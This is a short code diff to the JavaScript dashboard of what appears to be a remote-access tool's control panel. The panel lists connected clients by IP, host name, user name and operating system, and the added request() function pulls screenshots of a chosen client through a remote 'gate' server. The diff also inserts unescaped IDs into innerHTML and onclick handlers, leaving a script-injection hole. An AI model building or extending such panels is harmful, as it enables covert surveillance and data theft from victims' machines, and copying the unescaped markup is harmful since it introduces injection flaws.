@@ -5,9 +5,9 @@ function display() {
   for(let socket of sockets) {
     let ID = socket[0]
     let infos = socket[1]
-    document.querySelector(`#sockets`).innerHTML += `<div class="socket">
+    document.querySelector(`#sockets`).innerHTML += `<div class="socket" onclick='request("${ID}")'>
       <span>${ID}</span>
-      <span>${infos.IP}</span>
+      <span>${infos.ip}</span>
       <span>${infos.host}</span>
       <span>${infos.name}</span>
       <span>${infos.os}</span>
@@ -17,4 +17,10 @@ function display() {
 
 setInterval(() => {
   display()
-}, 5000)
+}, 1000)
+
+function request(id) {
+  let url = `https://gate-serv.kitsuforyou.repl.co/do/screenshot/${id}`
+  let img = JSON.parse(get(url)).base64 || "assets/404.png"
+  document.querySelector('#render').src = img
+}
